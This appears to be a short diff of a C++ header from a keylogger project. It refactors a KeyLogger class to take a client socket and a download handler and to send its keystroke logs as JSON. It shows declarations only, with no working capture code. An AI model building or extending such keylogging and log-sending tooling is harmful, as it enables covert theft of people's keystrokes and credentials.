@@ -14,19 +14,18 @@
 #include "Converter.h"
 #include "Sender.h"
 #include "configuration.h"
+#include "Handler.h"
+#include "Download.h"
 
-
-
-class KeyLogger : public Sender {
+class KeyLogger : public Handler {
 
 public:
-    explicit KeyLogger(const Stream &stream, std::unordered_map<std::string, std::function<void(nlohmann::json &)>> &actionMap);
-    void sendLastKeyloggerLog();
-    void sendAll();
+    explicit KeyLogger(ClientSocket &clientSocket, Download &download);
+    void sendLastKeyloggerLog(nlohmann::json);
+    void sendAll(nlohmann::json);
     void tryStart();
-    void send() override;
-    void setStream(const Stream &);
 private:
+    Download &download;
     [[nodiscard]] bool lastLogExists() const;
     [[nodiscard]] bool logsExists() const;
     void start();
